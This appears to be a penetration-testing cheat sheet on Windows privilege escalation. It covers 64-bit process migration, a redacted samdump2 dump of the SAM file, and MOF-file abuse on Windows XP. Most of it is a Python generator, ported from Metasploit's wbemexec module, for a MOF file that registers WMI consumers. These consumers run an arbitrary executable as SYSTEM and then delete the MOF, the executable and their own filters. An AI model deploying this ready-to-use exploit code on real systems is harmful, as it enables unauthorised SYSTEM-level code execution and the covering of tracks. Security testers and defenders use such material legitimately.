# Privilege Escalation

## Process Migration

There can be a number of valid reasons to migrate processes, notably from 32-bit to 64-bit.  The reason is that certain exploits can only be executed from a 64-bit process, or there can be a want to view the 64-bit registry.

```bash
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

## SAM File

```bash
root@kali:/tmp# samdump2 System SAM
Administrator:500:REDACTED:REDACTED:::
*disabled* Guest:501:REDACTED:REDACTED:::
*disabled* HelpAssistant:1000:REDACTED:REDACTED:::
*disabled* SUPPORT_388945a0:1002:REDACTED:REDACTED:::
```

## MOF Files

These are useful in the event of an arbitrary read/write on the file system as a SYSTEM User.  For this to work the OS must be XP or lower.  In effect, a MOF file written to `%SystemRoot%\System32\wbem\mof\`, will be compiled automatically by the OS, and allows arbitrary code execution.  A good overview of MOF files themselves is [Playing with MOF files on Windows, for fun & profit](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html).

To check for compilation success/failure, look for the file within `%SystemRoot%\System32\wbem\mof\good\`and `%SystemRoot%\System32\wbem\mof\bad\` respectively.

Below is a python version of metasploit's [wbemexec.rb](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb) for executing a file in the System32 folder.

```python
def genMof(mofName, exe):
    classname = str(randint(0, 9999))
    mof = """#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass{class}
{
      [key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
     [key] string Name;
      [not_null] string ScriptingEngine;
      string ScriptFileName;
      [template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"{exename}\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass{class}\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";
};
Instance of ActiveScriptEventConsumer as $cons2
{
  Name = "qndASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\{mofname}\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"{exename}\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass{class}\\"";
  QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
  Name = "qndfilt";
  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"{exename}\\"";
  QueryLanguage = "WQL";
};
instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
  Consumer = $cons2;
  Filter = $Filt2;
};
instance of MyClass{class} as $MyClass
{
  Name = "ClassConsumer";
};"""
    mof = sub('{class}', classname, mof)
    mof = sub('{exename}', exe, mof)
    mof = sub('{mofname}', mofName, mof)
    return mof
```

#### References

[Playing with MOF files on Windows, for fun & profit](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)  
[How to use WbemExec for a write privilege attack on Windows](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows)  
[https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb)



